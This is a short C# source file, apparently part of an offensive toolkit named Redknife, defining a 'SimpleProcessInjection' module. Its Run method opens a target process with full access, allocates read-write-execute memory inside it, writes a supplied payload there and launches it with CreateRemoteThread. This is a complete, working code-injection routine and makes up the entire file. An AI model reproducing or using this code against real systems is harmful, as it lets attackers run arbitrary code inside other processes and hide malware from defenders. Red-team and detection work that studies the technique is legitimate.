using System;
using System.Diagnostics;
using Redknife.APIs;

namespace Redknife.Modules
{
    public class SimpleProcessInjection : BaseProcessAwareModule
    {

        public override void Run()
        {
            LogUtil.Debug("Performing process injection into process '{0}' (PID: {1})", 0, this.Args.ProcessName, this.Args.PID);

            LogUtil.Debug("Opening process ID: {0}", 1, this.Args.PID);
            IntPtr hProcess = Kernel32.OpenProcess(0x001F0FFF, false, (int)this.Args.PID);

            LogUtil.Debug("Allocating memory for buffer...", 1);
            IntPtr addr = Kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            LogUtil.Debug("Writing payload to memory...", 1);
            Kernel32.WriteProcessMemory(hProcess, addr, this.Payload, this.Payload.Length, out outSize);

            LogUtil.Debug("Creating remote thread...", 1);
            IntPtr hThread = Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

    }
}
